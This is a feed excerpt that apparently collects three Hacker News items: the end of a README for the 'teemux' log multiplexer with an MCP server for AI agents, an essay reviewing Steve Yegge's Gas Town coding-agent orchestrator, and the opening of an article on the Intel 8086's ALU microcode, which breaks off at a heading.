    &lt;quote&gt;# Wrap your processes teemux --name api -- node api.js teemux --name worker -- node worker.js teemux --name webapp -- npm run dev teemux -- redis-server # View logs open http://127.0.0.1:8336/ curl http://127.0.0.1:8336/&lt;/quote&gt;
    &lt;head rend="h2"&gt;Features&lt;/head&gt;
    &lt;head rend="h3"&gt;Zero config&lt;/head&gt;
    &lt;p&gt;First process starts the server. Others connect automatically.&lt;/p&gt;
    &lt;head rend="h3"&gt;Multiple views&lt;/head&gt;
    &lt;p&gt;Browser for colors. Curl for plain text.&lt;/p&gt;
    &lt;head rend="h3"&gt;Pattern filtering&lt;/head&gt;
    &lt;p&gt;Include or exclude with wildcards.&lt;/p&gt;
    &lt;head rend="h3"&gt;Leader election&lt;/head&gt;
    &lt;p&gt;Automatic failover if leader exits.&lt;/p&gt;
    &lt;head rend="h2"&gt;MCP for AI Agents&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;get_logs&lt;/cell&gt;
        &lt;cell&gt;Recent logs from buffer&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;search_logs&lt;/cell&gt;
        &lt;cell&gt;Search with patterns&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;get_process_names&lt;/cell&gt;
        &lt;cell&gt;List processes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;clear_logs&lt;/cell&gt;
        &lt;cell&gt;Clear buffer&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;quote&gt;// Add to your MCP config { "mcpServers": { "teemux": { "command": "npx", "args": ["mcp-remote", "http://127.0.0.1:8336/mcp"] } } }&lt;/quote&gt;
    &lt;head rend="h2"&gt;FAQ&lt;/head&gt;
    &lt;head rend="h3"&gt;Why not just use &lt;code&gt;tail -f&lt;/code&gt;?&lt;/head&gt;
    &lt;p&gt;That would require restarting your services to redirect their output. Fine for one-off scripts, but impractical when you have long-running processes and don't want to restart them every time an agent needs to read logs.&lt;/p&gt;
    &lt;p&gt;With teemux, a persistent MCP server gives multiple AI agents access to logs as neededâwithout interrupting your development flow.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why "teemux"?&lt;/head&gt;
    &lt;p&gt;tee (Unix command that splits output) + mux (multiplexer) = teemux&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46733905</guid><pubDate>Fri, 23 Jan 2026 15:49:35 +0000</pubDate></item><item><title>Gas Town's Agent Patterns, Design Bottlenecks, and Vibecoding at Scale</title><link>https://maggieappleton.com/gastown</link><description>&lt;doc fingerprint="3714585349c384a7"&gt;
  &lt;main&gt;
    &lt;head rend="h4"&gt;Table of Contents&lt;/head&gt;
    &lt;head rend="h4"&gt;Table of Contents&lt;/head&gt;
    &lt;p&gt;A few weeks ago Steve Yegge published an elaborate manifesto and guide to Gas Town, his Mad-Max-Slow-Horses-Waterworld-etc-themed agent orchestrator that runs dozens of coding agents simultaneously in a metaphorical town of automated activity. Gas Town is entirely vibecoded, hastily designed with off-the-cuff solutions, and inefficiently burning through thousands of dollars a month in API costs.&lt;/p&gt;
    &lt;p&gt;This doesn’t sound promising, but it’s lit divisive debates and sparks of change across the software engineering community. A small hype machine has formed around it. It’s made the rounds through every engineering team’s Slack, probably twice. There’s somehow already a $GAS meme coin doing over $400k in earnings. This was not Yegge’s doing – someone else set it up on the crypto platform Bags which ties tokens to individual creators. The coin holds no legitimate relationship to Gas Town’s success or failure so this is the purest of pure speculative betting. I expect nothing less from the crypto bros. And the hype is justified. First, because it’s utterly unhinged, and second because it’s a serious indication of how agents will change the nature of software development from this point on.&lt;/p&gt;
    &lt;p&gt;You should at least skim through Yegge’s original article before continuing to read my reflections. First, because I’m not going to comprehensively summarise it. A challenging task given the sprawling, haphazard nature of the piece And second, because a even a one minute glance over Yegge’s style of writing will make the vibes clear.&lt;/p&gt;
    &lt;p&gt;We should take Yegge’s creation seriously not because it’s a serious, working tool for today’s developers (it isn’t). But because it’s a good piece of speculative design fiction that asks provocative questions and reveals the shape of constraints we’ll face as agentic coding systems mature and grow.&lt;/p&gt;
    &lt;p&gt;“Design fiction” or “speculative design” is a branch of design where you creating things (objects, prototypes, sketches) from a plausible near future. Not to predict what’s going to happen, but to provoke questions and start conversations about what could happen. Not in a bright-and-glorious-flying-cars way that futurism can sometimes fall into. But, most helpfully, in a way that thinks about banal details, overlooked everyday interactions, low status objects, imperfect implementations, knock-on effects, and inconveniences. See the Near Future Lab’s short explainer video and their Manual of Design Fiction if you want to learn more.&lt;/p&gt;
    &lt;p&gt;I also think Yegge deserves praise for exercising agency and taking a swing at a system like this, despite the inefficiencies and chaos of this iteration. And then running a public tour of his shitty, quarter-built plane while it’s mid-flight.&lt;/p&gt;
    &lt;p&gt;When I was taken to the Tate Modern as a child I’d point at Mark Rothko pieces and say to my mother “I could do that”, and she would say “yes, but you didn’t.” Many people have talked about what large-scale, automated agent orchestration systems could look like in a few years, and no one else attempted to sincerely build it.&lt;/p&gt;
    &lt;p&gt;I should be transparent and say that I have not used Gas Town in earnest on any serious work. I have only lightly poked at it, because I do not qualify as a serious user when I’m still hovering around stages 4-6 in Yegge’s 8 levels of automation:&lt;/p&gt;
    &lt;p&gt;I currently juggle a handful of consecutive Claude Code and OpenCode agents, but pay close attention to the diffs and regularly check code in an IDE. Which I guess puts me in the agentically conservative camp in this distressingly breakneck moment in history.&lt;/p&gt;
    &lt;p&gt;Gas Town is a full-on stage 8 piece of tooling: using an orchestrator that manages dozens+ of other coding agents for you. Yegge also warned me not to seriously use Gas Town multiple times, in increasingly threatening typography. I trust his guidance on his own slush pile.&lt;/p&gt;
    &lt;p&gt;But I have grokked the basic concepts and spent more time with this manifesto than is warranted. And here is what stood out to me from the parts I could comprehend:&lt;/p&gt;
    &lt;head rend="h2"&gt;1. Design and planning becomes the bottleneck when agents write all the code&lt;/head&gt;
    &lt;p&gt;When you have a fat stack of agents churning through code tasks, development time is no longer the bottleneck. Yegge says “Gas Town churns through implementation plans so quickly that you have to do a LOT of design and planning to keep the engine fed.” Design becomes the limiting factor: imagining what you want to create and then figuring out all the gnarly little details required to make your imagination into reality.&lt;/p&gt;
    &lt;p&gt;I certainly feel this friction in both my own professional work and personal projects. My development velocity is far slower than Yegge since I only wrangle a few agents at a time and keep my eyes and hands on the code. But the build time is rarely what holds me up. It is always the design; how should we architect this? What should this feel like? How should this look? Is that transition subtle enough? How composable should this be? Is this the right metaphor?&lt;/p&gt;
    &lt;p&gt;When it’s not the design, it’s the product strategy and planning; What are the highest priority features to tackle? Which piece of this should we build first? When do we need to make that decision? What’s the next logical, incremental step we need to make progress here?&lt;/p&gt;
    &lt;p&gt;These are the kind of decisions that agents cannot make for you. They require your human context, taste, preferences, and vision.&lt;/p&gt;
    &lt;p&gt;With agents to hand, it’s easy to get ahead of yourself, stumbling forward into stacks of generated functions that should never have been prompted into existence, because they do not correctly render your intentions or achieve your goals.&lt;/p&gt;
    &lt;p&gt;Gas Town seems to be halfway into this pitfall. The biggest flaw in Yegge’s creation is that it is poorly designed. I mean this in the sense that he absolutely did not design the shape of this system ahead of time, thoughtfully considering which metaphors and primitives would make this effective, efficient, easy to use, and comprehensible.&lt;/p&gt;
    &lt;p&gt;He just made stuff up as he went. He says as much himself: “Gas Town is complicated. Not because I wanted it to be, but because I had to keep adding components until it was a self-sustaining machine.” Gas Town is composed of “especially difficult [theories] because it’s a bunch of bullshit I pulled out of my arse over the past 3 weeks, and I named it after badgers and stuff.” It was slapdashed together over “17 days, 75k lines of code, 2000 commits. It finally got off the ground (GUPP started working) just 2 days ago.” Do not ask what GUPP is; I cannot concisely explain without getting deep into it. Which we’ll do in a minute.&lt;/p&gt;
    &lt;p&gt;This Hacker News comment from qcnguy describes the problem well, and points out that Yegge’s previous Beads project, of which Gas Town is an extension, suffers the same issue:&lt;/p&gt;
    &lt;p&gt;“Beads is a good idea with a bad implementation. It’s not a designed product in the sense we are used to, it’s more like a stream of consciousness converted directly into code. It’s a program that isn’t only vibe coded, it was vibe designed too.”&lt;/p&gt;
    &lt;p&gt;“Gas Town is clearly the same thing multiplied by ten thousand. The number of overlapping and ad hoc concepts in this design is overwhelming. Steve is ahead of his time but we aren’t going to end up using this stuff. Instead a few of the core insights will get incorporated into other agents in a simpler but no less effective way.”&lt;/p&gt;
    &lt;p&gt;Or this review from astrra.space on Bluesky:&lt;/p&gt;
    &lt;p&gt;“gas town [is] such a nightmare to use i love it… the mayor is dumb as rocks the witness regularly forgets to look at stuff the deacon makes his own rules the crew have the object permanence of a tank full of goldfish and the polecats seem intent on wreaking as much chaos on the project as they can. this is peak entertainment i swear”&lt;/p&gt;
    &lt;p&gt;Friends and colleagues of mine who have been brave enough to try out Gas Town in more depth report the same thing; this thing fits the shape of Yegge’s brain and no one else’s. I’d categorise that as a moderate design fail, given this is a public product that I assume Yegge wants at least some people to try out. The onboarding is baptism by fire.&lt;/p&gt;
    &lt;p&gt;This feels like one of the most critical, emerging footguns of liberally hands-off agentic development. You can move so fast you never stop to think. It is so easy to prompt, you don’t fully consider what you’re building at each step of the process. It is only once you are hip-deep in poor architectural decisions, inscrutable bugs, and a fuzzy memory of what you set out to do, do you realise you have burned a billion tokens in exchange for a pile of hot trash.&lt;/p&gt;
    &lt;head rend="h2"&gt;2. Buried in the chaos are sketches of future agent orchestration patterns&lt;/head&gt;
    &lt;p&gt;Now that I’ve just critiqued the design of Gas Town, I will turn around and say that while the current amalgamation of polecats, convoys, deacons, molecules, protomolecules, mayors, seances, hooks, beads, witnesses, wisps, rigs, refineries, and dogs is a bunch of under cooked spaghetti, Yegge’s patterns roughly sketch out some useful conceptual shapes for future agentic systems.&lt;/p&gt;
    &lt;p&gt;If you step back and squint, this mishmash of concepts reveals a few underlying patterns that future agentic systems will likely follow:&lt;/p&gt;
    &lt;head rend="h3"&gt;Agents have specialised roles with hierarchical supervision&lt;/head&gt;
    &lt;p&gt;Every agent in Gas Town has a permanent, specialised role. When an agent spins up a new session, it knows who it is and what job it needs to do. Some examples:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Mayor is the human concierge: it’s the main agent you talk to. It talks to all the other agents for you, kicking off work, receiving notifications when things finish, and managing the flow of production.&lt;/item&gt;
      &lt;item&gt;Polecats are temporary grunt workers. They complete single, isolated tasks, then disappear after submitting their work to be merged.&lt;/item&gt;
      &lt;item&gt;The Witness supervises the Polecats and helps them get unstuck. Its job is to solve problems and nudge the proletariat workers along.&lt;/item&gt;
      &lt;item&gt;The Refinery manages the merge queue into the main branch. It evaluates each piece of work waiting to be merged, resolving conflicts in the process. It can creatively “re-imagine” implementations if merge conflicts get too hairy, while trying to keep the intent of the original work.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There are many more characters in this town, but these give you a flavour of the system. Giving each agent a single job means you can prompt them more precisely, limit what they’re allowed to touch, and run lots of them at once without them stepping on each other’s toes.&lt;/p&gt;
    &lt;p&gt;There’s also a clear chain of command between these agents. You talk to the Mayor, who coordinates work across the system. The Mayor in Gas Town never writes code. It talks to you, then creates work tasks and assigns them to workers. A set of system supervisors called the Witness, the Deacon, and “Boot the Dog” intermittently nudge the grunt workers and each other to check everyone is doing their work. Oh and there’s also a crew of “dogs” who do maintenance and cleaning.&lt;/p&gt;
    &lt;p&gt;It’s easier if I try and show you. Here’s the basic relationship structure of Gas Town, as best I can make out:&lt;/p&gt;
    &lt;p&gt;Since I’m making my own visuals here, I should justify it by pointing out that while Yegge made lots of his own ornate, zoopmorphic diagrams of Gas Town’s architecture and workflows, they are unhelpful. Primarily because they were made entirely by Gemini’s Nano Banana . And while Nano Banana is state-of-the-art at making diagrams, generative AI systems are still really shit at making illustrative diagrams. They are very hard to decipher, filled with cluttered details, have arrows pointing the wrong direction, and are often missing key information. Case in point:&lt;/p&gt;
    &lt;p&gt;Does this help you understand how the system works? No? No.&lt;/p&gt;
    &lt;p&gt;Gas Town’s hierarchical approach solves both a coordination and attention problem. Without it, you are the one assigning tasks to dozens individual agents, checking who’s stuck, who’s idle, and who’s waiting on work from someone else. With the Mayor as your single interface, that overhead disappears. You can continuously talk to the Mayor without interrupting any agents or getting in the way, or having to think much about which one is doing what. This is less cognitive overhead than constantly switching tabs between Claudes.&lt;/p&gt;
    &lt;p&gt;I think there’s a lot of opportunity to diversify the cast of characters here and make more use of specialist subagents . The agents in Gas Town are all generalist workers in the software development pipeline. But we could add in any kind of specialist we want: a dev ops expert, a product manager, a front-end debugger, an accessibility checker, a documentation writer. These would be called in on-demand to apply their special skills and tools.&lt;/p&gt;
    &lt;head rend="h3"&gt;Agent roles and tasks persist, sessions are ephemeral&lt;/head&gt;
    &lt;p&gt;One of the major limitations of current coding agents is running out of context. Before you even hit the limits of a context window, context rot degrades the output enough that it’s not worth keeping. We constantly have to compact or start fresh sessions.&lt;/p&gt;
    &lt;p&gt;Gas Town’s solution to this is make each agent session disposable by design. It stores the important information – agent identities and tasks – in Git, then liberally kills off sessions and spins up fresh ones when needed. New sessions are told their identity and currently assigned work, and continue on where the last one left off. Gas Town also lets new sessions ask their predecessors what happened through “seancing”: resuming the last session as a separate instance in order to let the new agent ask questions about unfinished work.&lt;/p&gt;
    &lt;p&gt;This saving and recalling is all done through Gas Town’s “Beads” system. Beads is also the name of the memory management system Yegge built before Gas Town; a precursor to this more ambitious civilisation. Beads are tiny, trackable units of work – like issues in an issue tracker – stored as JSON in Git alongside your code. Each bead has an ID, description, status, and assignee. Agent identities are also stored as beads, giving each worker a persistent address that survives session crashes.&lt;/p&gt;
    &lt;p&gt;Yegge didn’t invent this pattern of tracking atomic tasks outside agent memory in something structured like JSON. Anthropic described the same approach in their research on effective harnesses for long-running agents , just published in November 2025. I give it a hot minute before this type of task tracking lands in Claude Code.&lt;/p&gt;
    &lt;head rend="h3"&gt;Feeding agents continuous streams of work&lt;/head&gt;
    &lt;p&gt;The whole promise of an orchestration system like Gas Town is it’s a perpetual motion machine. You give high-level orders to the mayor, and then a zoo of agents kicks off to break it down into tasks, assign them, execute them, check for bugs, fix the bugs, review the code, and merge it in.&lt;/p&gt;
    &lt;p&gt;Each worker agent in Gas Town has its own queue of assigned work and a “hook” pointing to the current thing they should be doing. The minute they finish a task, the next one jumps to the front of the queue. The mayor is the one filling up these queues – it’s in charge of breaking down large features into atomic tasks and assigning them to available workers. In theory, the workers are never idle or lacking tasks, so long as you keep feeding the mayor your grand plans.&lt;/p&gt;
    &lt;p&gt;This principle of “workers always do their work” is better in theory than practice. It turns out to be slightly difficult to make happen because of the way current models are trained. They’re designed as helpful assistants who wait politely for human instructions. They’re not used to checking a task queue and independently getting on with things.&lt;/p&gt;
    &lt;p&gt;Gas Town’s patchwork solution to this is aggressive prompting and constant nudging. Supervisor agents spend their time poking workers to see if anyone’s stalled out or run dry on work. When one goes quiet, they send it a ping which jolts the agent into checking its queue and getting back to work. These periodic nudges move through the agent hierarchy like a heartbeat keeping everything moving. This is a decent band-aid for the first version, but more serious efforts at agent orchestration systems will need reliable ways to keep agents on task.&lt;/p&gt;
    &lt;head rend="h3"&gt;Merge queues and agent-managed conflicts&lt;/head&gt;
    &lt;p&gt;When you have a bunch of agents all working in parallel, you’re of course going to run into merge conflicts. Each agent is off on its own branch, and by the time it finishes its task, the main branch might look completely different – other changes have landed, the code has moved on. The later an agent finishes, the worse this gets. Normally you, the human, takes on the burden of sorting out the mess and deciding which changes to keep. But if agents are running on their own, something has to do that job for them.&lt;/p&gt;
    &lt;p&gt;So Gas Town has a dedicated merge agent – the Refinery – that works through the merge queue one change at a time. It looks at each merge request, resolves any conflicts, and gets it into main. When things get really tangled – when so much has changed that the original work doesn’t even make sense anymore – it can creatively “re-imagine” the changes: re-doing the work to fit the new codebase. Or escalate to a human if needed.&lt;/p&gt;
    &lt;p&gt;But there’s another way to sidestep merge conflict nightmares that Gas Town doesn’t have built in: ditch PRs for stacked diffs . The traditional git workflow puts each feature on its own branch for days or weeks, accumulating commits, then getting merged back as one chunky PR.&lt;/p&gt;
    &lt;p&gt;Stacked diffs avoid this conflict-prone approach by breaking work into small, atomic changes that each get reviewed and merged on their own, building on top of each other. Every change gets its own branch, forked off the previous change, forming a “stack” of changes dependent on one another. When a change earlier in the stack gets updated, all the changes below it automatically rebase on top of the new version.&lt;/p&gt;
    &lt;p&gt;This fits how agents naturally work. They’re already producing tiny, focused changes rather than sprawling multi-day branches. When conflicts do pop up, they’re easier to untangle because each diff touches less code. Cursor ’s recent acquisition of Graphite , a tool built specifically for stacked diff workflows, suggests I am not the only one who sees this opportunity. When you’ve got dozens of agents landing changes continuously, you need tools and interfaces specifically designed for these frequent, incremental merges.&lt;/p&gt;
    &lt;head rend="h2"&gt;3. The price is extremely high, but so is the (potential) value&lt;/head&gt;
    &lt;p&gt;Yegge describes Gas Town as “expensive as hell… you won’t like Gas Town if you ever have to think, even for a moment, about where money comes from.” He’s on his second Claude account to get around Anthropic’s spending limits.&lt;/p&gt;
    &lt;p&gt;I can’t find any mention online of the per-account limits, but let’s conservatively assume he’s spending at least $2,000 USD per month, and liberally $5,000. Now covered by the $75,000 he’s earned in transaction fees from the $GAS cryptocoin, which gives him a good year to run this at scale&lt;/p&gt;
    &lt;p&gt;The current cost is almost certainly artificially inflated by system inefficiency. Work gets lost, bugs get fixed numerous times, designs go missing and need redoing. As models improve and orchestration patterns mature, the cost of orchestrators like this should drop while output quality rises.&lt;/p&gt;
    &lt;p&gt;I expect companies would happily pay around the $1-3k/month mark for a sane, understandable, higher quality, and lower waste version of Gas Town. Maybe that sounds absurd to you, given we’ve all become anchored to the artificially low rate of $100-200/month for unlimited usage by the major providers. But once the AI bubble pops, the VC funds dry up, and providers have to charge the true cost of inference at scale, we should expect that “unlimited” tier to look a lot pricier.&lt;/p&gt;
    &lt;p&gt;Even when that comes to pass, a few thousand is pretty reasonable when you compare it to an average US senior developer salary: $120,000 USD. Salary average from Indeed . Many people will pick bones over this because the market range is so broad. FAANG engineers in San Fransisco are paid closer to half a million, while developers in Europe are used to salaries in the $30-50k range. This seems like a sensible middle ground. If Gas Town could genuinely speed up the work of a senior developer by 2-3x or more, it would easily be worth 10-30% of their salary. The cost per unit of valuable work starts to look competitive with human labor.&lt;/p&gt;
    &lt;p&gt;The maths on paying for something like this is already defensible in wealthier places like the US and parts of Western Europe. In spots where developer salaries are lower, we would expect the budget for AI assisted tools adjusts accordingly. They’ll get less crazy scaled automation and more conversative useage with humans filling in the cognitive gaps.&lt;/p&gt;
    &lt;head rend="h2"&gt;4. Yegge never looks at code. When should we stop looking too?&lt;/head&gt;
    &lt;p&gt;Yegge is leaning into the true definition of vibecoding with this project: “It is 100% vibecoded. I’ve never seen the code, and I never care to.” Not looking at code at all is a very bold proposition, today, in January 2026.&lt;/p&gt;
    &lt;p&gt;Given the current state of models and the meagre safeguards we have in place around them, the vast majority of us would consider this blind coding approach irresponsible and daft to do on anything that isn’t a throwaway side project. Which, given the amount of effort and Claude tokens Yegge has sunk into building it, writing documentation, and publicly promoting it, Gas Town is not.&lt;/p&gt;
    &lt;p&gt;“Should developers still look at code?” will become one of the most divisive and heated debates over the coming years. You might be offended by the question, and find it absurd anyone is asking. But it’s a sincere question and the answer will change faster than you think.&lt;/p&gt;
    &lt;p&gt;I’m already seeing people divide along moralistic, personal identity lines as they try to answer it. Some declare themselves purist, AI skeptic, Real Developers who check every diff and hand-adjust specific lines, sneering at anyone reckless enough to let agents run free. While others lean into agentic maximalism, directing fleets from on high and pitying the mass of luddites still faffing about with manual edits like it’s 2019. Both camps mistake a contextual judgement for a personality trait and firm moral position.&lt;/p&gt;
    &lt;p&gt;A more conservative, easier to consider, debate is: how close should the code be in agentic software development tools? How easy should it be to access? How often do we expect developers to edit it by hand?&lt;/p&gt;
    &lt;p&gt;Interfaces like Claude Code , Cursor , and Conductor do not put code front and centre in the experience. The agent is your first and primary interface. You might be able to see diffs rolls by or display code files inline, but you can’t touch them. Trying to edit code yourself is a roundabout journey of opening your IDE and navigating to the correct files and lines.&lt;/p&gt;
    &lt;p&gt;This design choice assumes it is easier to ask an agent to make the change for you, than it is to type it out the syntax yourself. They clearly say “we don’t believe users need to touch code.”&lt;/p&gt;
    &lt;p&gt;Framing this debate as an either/or – either you look at code or don’t, either you edit code by hand or you exclusively direct agents, either you’re the anti-AI-purist or the agentic-maxxer – is unhelpful. Because nothing is a strict binary.&lt;/p&gt;
    &lt;p&gt;The right distance isn’t about what kind of person you are or what you believe about AI capabilities in the current moment. How far away you step from the syntax shifts based on what you’re building, who you’re building with, and what happens when things go wrong. The degree of freedom you hand over to agents depends on:&lt;/p&gt;
    &lt;head rend="h3"&gt;Domain and programming language&lt;/head&gt;
    &lt;p&gt;Front-end versus backend makes a huge difference. Language is a poor medium for designing easing curves and describing aesthetic feelings – I always need to touch the CSS, and it’s often faster to just tweak directly than try to explain what I want. Yegge’s CLI tooling is much easier to validate with pass/fail tests than evaluating whether a notification system “feels calm enough”. Model competence also varies wildly by language; prompting React and Tailwind gives you much better results than Rust or Haskell, where the models still regularly choke on borrow checkers and type systems.&lt;/p&gt;
    &lt;head rend="h3"&gt;Access to feedback loops and definitions of succes&lt;/head&gt;
    &lt;p&gt;The more agents can validate their own work, the better the results. If you let agents run tests and see the output, they quickly learn what’s broken and how to fix it. If you let them open browsers, take screenshots, and click around, they can spot their mistakes. Tools like the Ralph Wiggum plugin lean into this – it loops until tests pass or some specific condition is validated. This doesn’t work for less defined, clear cut work though. If you try to make an agent design a visual diagram for you, it’s going to struggle. It doesn’t know your aesthetic preferences and can’t really “see” what it’s making.&lt;/p&gt;
    &lt;head rend="h3"&gt;Risk tolerance for shit going wrong&lt;/head&gt;
    &lt;p&gt;Stakes matter. If an agent breaks some images on your personal blog, you’ll recover. But if you’re running a healthcare system where a bug could miscalculate drug dosages, or a banking app moving actual money around, you can’t just wave an agent at it and hope. Consequences scale up fast. Corporate software has people whose entire job is compliance and regulatory sign-off – they need to see the code, understand it, verify it meets requirements. Those people aren’t going to let you widly run Gas Town over projects without serious guardrails in place.&lt;/p&gt;
    &lt;p&gt;“Gas Town sounds fun if you are accountable to nobody: not for code quality, design coherence or inferencing costs. The rest of us are accountable for at least the first two and even in corporate scenarios where there is a blank check for tokens, that can’t last. So the bottleneck is going to be how fast humans can review code and agree to take responsibility for it.”&lt;/p&gt;
    &lt;head rend="h3"&gt;Greenfield vs. brownfield projects&lt;/head&gt;
    &lt;p&gt;Starting fresh (greenfield), means you can let agents make architectural decisions and establish patterns – if you don’t like them, you can easily throw it out and restart. The cost of mistakes is low. But in an existing codebase (brownfield) with years of accumulated conventions, implicit patterns, and code that exists for reasons nobody remembers anymore, agents need much tighter supervision. They’ll happily introduce a new pattern that contradicts the three other ways this codebase already solves the same problem.&lt;/p&gt;
    &lt;head rend="h3"&gt;Number of collaborators&lt;/head&gt;
    &lt;p&gt;If you’re solo of course you can YOLO. If you’re working with more than a handful of people, you’ll have to agree on coding standards and agent rules. This creates its own overhead: updating the AGENTS.md file, picking MCPs, writing commands and skills and rules and whatever else we invent to constrain these things. The pace of change when you’re all using agents can be overwhelming and you need to figure out a sensible reviewing pipeline to manage it. Team coordination can fall apart when everyone’s agents start moving too fast. You might show up in the morning and discover someone’s agent renamed the database schema while another agent refactored the whole API layer, and neither of which jive with your giant, unmerged feature.&lt;/p&gt;
    &lt;head rend="h3"&gt;Your experience level&lt;/head&gt;
    &lt;p&gt;More senior developers can prompt better, debug better, and setup more stringent preferences earned through decades of seeing what can go wrong in scaled, production environments. They can recognize patterns: “oh, that’s a memory leak” or “that’s going to deadlock under load.” Newer developers don’t have that catalog of failures yet and are much more likely to prompt their own personal house of cards. The tests might pass and everything looks fine until you hit production traffic or someone enters a weird character. It is hard to defend against unknown unknowns.&lt;/p&gt;
    &lt;p&gt;Given all these “it depends” considerations, I’m currently in the code-must-be-close camp for most serious work done by professional developers. But I expect I’ll shift to the code-at-a-distance camp over the next year or two as the harnesses and tools we wrap around these agents mature. If we can ship them with essential safe guards and quality gates, the risks drop. Sure, the models will also improve, but the infrastructure matters far more: validation loops, tests, and specialised subagents who focus on security, debugging, and code quality are what will make code-at-a-distance feasible.&lt;/p&gt;
    &lt;p&gt;We have many, continuous versions of the code distance debate interally at Github Next . One of the projects within the team driving this is Agentic Workflows – autonomous agents run through GitHub Actions in response to events: new PRs, new issues, or specific times of day. Every commit can trigger a security review agent, an accessibility audit, and a documentation updater, all running in parallel alongside traditional CI/CD tests before anything lands in main. The team building it rarely touches code and do most of their work by directing agents from their phones. It’s these kinds of guardrails that makes a hands-off Sim-City-esque orchestrator system feel less terrifying to me.&lt;/p&gt;
    &lt;p&gt;I don’t believe Gas Town itself is “it”. It’s not going to evolve into the thing we all use, day in and day out, in 2027. As I said, it’s a provocative piece of speculative design, not a system many people will use in earnest. In the same way any poorly designed object or system gets abandoned, this manic creation is too poorly thought through to persist. But the problems it’s wrestling with and the patterns it has sketched out will unquestionably show up in the next generation of development tools.&lt;/p&gt;
    &lt;p&gt;As the pace of software development speeds up, we’ll feel the pressure intensify in other parts of the pipeline: thoughtful design, critical thinking, user research, planning and coordination within teams, deciding what to build, and whether it’s been built well. The most valuable tools in this new world won’t be the ones that generate the most code fastest. They’ll be the ones that help us think more clearly, plan more carefully, and keep the quality bar high while everything accelerates around us.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46734302</guid><pubDate>Fri, 23 Jan 2026 16:19:18 +0000</pubDate></item><item><title>Notes on the Intel 8086 processor's arithmetic-logic unit</title><link>https://www.righto.com/2026/01/notes-on-intel-8086-processors.html</link><description>&lt;doc fingerprint="e3119f7983d6dae0"&gt;
  &lt;main&gt;
    &lt;p&gt;In 1978, Intel introduced the 8086 processor, a revolutionary chip that led to the modern x86 architecture. Unlike modern 64-bit processors, however, the 8086 is a 16-bit chip. Its arithmetic/logic unit (ALU) operates on 16-bit values, performing arithmetic operations such as addition and subtraction, as well as logic operations including bitwise AND, OR, and XOR. The 8086's ALU is a complicated part of the chip, performing 28 operations in total.1&lt;/p&gt;
    &lt;p&gt;In this post, I discuss the circuitry that controls the ALU, generating the appropriate control signals for a particular operation. The process is more complicated than you might expect. First, a machine code instruction results in the execution of multiple microcode instructions. Using the ALU is a two-step process: one microcode instruction (micro-instruction) configures the ALU for the desired operation, while a second micro-instruction gets the results from the ALU. Moreover, based on both the microcode micro-instruction and the machine code instruction, the control circuitry sends control signals to the ALU, reconfiguring it for the desired operation. Thus, this circuitry provides the "glue" between the micro-instructions and the ALU.&lt;/p&gt;
    &lt;p&gt;The die photo below shows the 8086 processor under a microscope. I've labeled the key functional blocks. Architecturally, the chip is partitioned into a Bus Interface Unit (BIU) at the top and an Execution Unit (EU) below. The BIU handles bus and memory activity as well as instruction prefetching, while the Execution Unit (EU) executes the instructions. In the lower right corner, the microcode ROM holds the micro-instructions. The ALU is in the lower left corner, with bits 7-0 above and bits 15-8 below, sandwiching the status flag circuitry. The ALU control circuitry, highlighted in red at the bottom of the chip, is the focus of this article.&lt;/p&gt;
    &lt;head rend="h2"&gt;Microcode&lt;/head&gt;
    &lt;p&gt;The 8086 processor implements most machine instructions in microcode, with a micro-instruction for each step of the machine instruction. (I discuss the 8086's microcode in detail here.) The 8086 uses an interesting architecture for microcode: each micro-instruction performs two unrelated operations. The first operation moves data between a source and a destination. The second operation can range from a jump or subroutine call to a memory read/write or an ALU operation. An ALU operation has a five-bit field to specify a particular operation and a two-bit field to specify which temporary register provides the input. As you'll see below, these two fields play an important role in the ALU circuitry.&lt;/p&gt;
    &lt;p&gt;In many cases, the 8086's micro-instruction doesn't specify the ALU operation, leaving the details to be substituted from the machine instruction opcode. For instance, the ADD, SUB, ADC, SBB, AND, OR, XOR, and CMP machine instructions share the same microcode, while the hardware selects the ALU operation from the instruction opcode. Likewise, the increment and decrement instructions use the same microcode, as do the decimal adjust instructions DAA and DAS, and the ASCII adjust instructions AAA and AAS. Inside the micro-instruction, all these operations are performed with a "pseudo" ALU operation called XI (for some reason). If the microcode specifies an XI ALU operation, the hardware replaces it with the ALU operation specified in the instruction. Another important feature of the microcode is that you need to perform one ALU micro-instruction to configure the ALU's operation, but the result isn't available until a later micro-instruction, which moves the result to a destination. This has the consequence that the hardware must remember the ALU operation.&lt;/p&gt;
    &lt;p&gt;To make this concrete, here is the microcode that implements a typical arithmetic instruction such as &lt;code&gt;ADD AL, BL&lt;/code&gt; or &lt;code&gt;XOR [BX+DI], CX&lt;/code&gt;.
This microcode consists of three micro-instructions. 
The left half of each micro-instruction specifies a data movement, first moving the two arguments to ALU temporary registers
and then storing the ALU result (called Σ).
The right half of each micro-instruction performs the second task.
First, the ALU is configured to perform an &lt;code&gt;XI&lt;/code&gt; operation using temporary register A. Recall that &lt;code&gt;XI&lt;/code&gt; indicates the ALU operation
is filled in from the machine instruction; this is how the same microcode handles eight different types of machine instructions.
In the second micro-instruction, the next machine instruction is started unless a memory writeback is required (&lt;code&gt;WB&lt;/code&gt;).
The last micro-instruction is &lt;code&gt;RNI&lt;/code&gt; (Run Next Instruction) to start a new machine instruction. It also indicates that the
processor status flags (&lt;code&gt;F&lt;/code&gt;) should be updated to indicate if the ALU result is zero, positive, overflow, and so forth.2&lt;/p&gt;
    &lt;quote&gt;M → tmpa XI tmpa Load first argument, configure ALU. R → tmpb WB,NXT Load second argument, start Next instruction if no memory writeback Σ → M RNI F Store ALU result, Run Next Instruction, update status Flags&lt;/quote&gt;
    &lt;head rend="h2"&gt;The ALU circuit&lt;/head&gt;
